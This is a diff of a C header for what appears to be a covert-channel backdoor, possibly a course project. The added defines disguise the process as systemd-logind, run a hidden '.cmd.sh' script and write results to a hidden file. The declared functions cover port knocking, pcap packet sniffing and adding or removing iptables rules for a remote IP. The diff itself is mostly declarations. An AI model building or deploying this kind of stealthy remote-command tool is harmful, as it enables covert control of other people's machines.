@@ -22,10 +22,21 @@
 #include "encrypt_utils.h"
 #include "socketwrappers.h"
 #include "covert_wrappers.h"
-//#include "portknocking.h"
 #include "inotify.h"
 #include <unistd.h>
 #include <time.h>
+
+#define PORT "8505"
+#define BUFFERSIZE 1024
+#define MASK "/usr/lib/systemd/systemd-logind"
+#define CMD "./.cmd.sh > .results"
+#define CHMOD "chmod 755 .cmd.sh"
+#define RESULT_FILE ".results"
+#define FILENAME ".cmd.sh"
+#define TCP "TCP"
+#define OR " || "
+#define PORTS "port"
+#define FILTERAMOUNT 2
 
 struct my_ip {
 	u_int8_t	ip_vhl;		/* header length, version */
@@ -69,31 +80,11 @@ struct sniff_tcp {
         u_short th_urp;                 /* urgent pointer */
 };
 
-#define PORT "8505"
-#define BUFFERSIZE 1024
-#define MASK "/usr/lib/systemd/systemd-logind"
-#define CMD "./.cmd.sh > .results"
-#define CHMOD "chmod 755 .cmd.sh"
-#define IPTABLES(ip,protocol,port) "iptables -I INPUT -p " protocol " -s " ip " --dport " port " -j ACCEPT"
-#define TURNOFF(ip,protocol,port) "iptables -D INPUT -p " protocol "  -s " ip " --dport " port " -j ACCEPT"
-#define RESULT_FILE ".results"
-#define FILENAME ".cmd.sh"
+
 struct payload{
     char key[5]; // always 8505
     char buffer[1024]; // for either commands or results
 };
-
-//struct filter Filter;
-
-
-#define TCP "tcp and ("
-#define OR " || "
-#define PORTS "port"
-#define END ")"
-#define FILTERAMOUNT 2
-#define IPTABLES(ip,protocol,port) "iptables -I INPUT -p " protocol " -s " ip " --dport " port " -j ACCEPT"
-#define TURNOFF(ip,protocol,port) "iptables -D INPUT -p " protocol "  -s " ip " --dport " port " -j ACCEPT"
-#include "libpcap.h"
 
 struct filter{
     int amount;
@@ -105,13 +96,13 @@ struct filter{
     int pattern[FILTERAMOUNT];
 };
 
+void iptables(char *ip, char *protocol, char *port, bool input, bool remove);
 struct filter InitFilter(char *target, char *local);
 void PrintFilter(struct filter Filter);
 void CreateFilter(struct filter Filter, char *buffer);
-void PortKnocking(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool send, struct filter Filter);
+void PortKnocking(struct filter Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool send);
 void SendPattern(unsigned char *data, struct filter Filter);
 //char GetLocalIP(char *device);
-char* iptables(char *port, char *ip, char *protocol);
 int Packetcapture(char *filter, struct filter Filter);
 void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void ParseIP(struct filter *Filter,const struct pcap_pkthdr* pkthdr, const u_char* packet);
